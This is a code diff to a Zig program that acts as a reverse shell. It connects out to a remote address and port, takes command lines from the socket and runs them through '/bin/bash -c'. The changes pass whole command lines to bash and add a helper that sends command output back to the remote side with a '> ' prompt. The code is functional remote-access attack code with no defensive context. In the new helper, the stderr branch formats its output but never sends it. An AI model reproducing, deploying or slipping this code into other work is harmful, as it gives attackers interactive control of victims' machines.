@@ -7,25 +7,40 @@ fn readCommand(socket: std.net.Stream) ![][]const u8 {
     const allocator = std.heap.page_allocator;
     var cmd = std.ArrayList([]const u8).init(allocator);
     defer cmd.deinit();
+    try cmd.appendSlice(&[_][]const u8{ "/bin/bash", "-c" });
 
     var buf: [MAX_INPUT_BYTES]u8 = undefined;
     const buf_size = try socket.read(buf[0..]);
     if (buf_size == 0) return error.ServerClosed;
 
-    const tmp = buf[0 .. buf_size - 1]; // Remove last character ('\n')
-    var cmd_spl = std.mem.splitSequence(u8, tmp, " ");
-    while (cmd_spl.next()) |c| {
-        if (c.len > 0) {
-            try cmd.append(try allocator.dupe(u8, c));
-        }
-    }
+    try cmd.append(try allocator.dupe(u8, buf[0 .. buf_size - 1])); // Remove last character ('\n') from the buf.
 
     return cmd.toOwnedSlice();
+}
+
+fn sendResult(allocator: std.mem.Allocator, socket: std.net.Stream, stdout: []const u8, stderr: []const u8) !void {
+    if (stdout.len > 0) {
+        const out = std.fmt.allocPrint(allocator, "{s}\n> ", .{stdout}) catch {
+            _ = try socket.writeAll("> ");
+            return;
+        };
+        defer allocator.free(out);
+        _ = try socket.writeAll(out);
+    } else if (stderr.len > 0) {
+        const out = std.fmt.allocPrint(allocator, "{s}\n> ", .{stderr}) catch {
+            _ = try socket.writeAll("> ");
+            return;
+        };
+        defer allocator.free(out);
+    } else {
+        _ = try socket.writeAll("> ");
+    }
 }
 
 pub fn run(allocator: std.mem.Allocator, addr: []const u8, port: u16) !void {
     var socket = try std.net.tcpConnectToHost(allocator, addr, port);
     defer socket.close();
+    try sendResult(allocator, socket, "", "");
 
     const page_alloc = std.heap.page_allocator;
     var output_stdout = std.ArrayList(u8).init(page_alloc);
@@ -63,13 +78,6 @@ pub fn run(allocator: std.mem.Allocator, addr: []const u8, port: u16) !void {
             continue;
         };
 
-        // Send the output to the server.
-        if (output_stdout.items.len > 0) {
-            _ = try socket.writeAll(output_stdout.items);
-        } else if (output_stderr.items.len > 0) {
-            _ = try socket.writeAll(output_stderr.items);
-        } else {
-            _ = try socket.writeAll("");
-        }
+        try sendResult(allocator, socket, output_stdout.items, output_stderr.items);
     }
 }
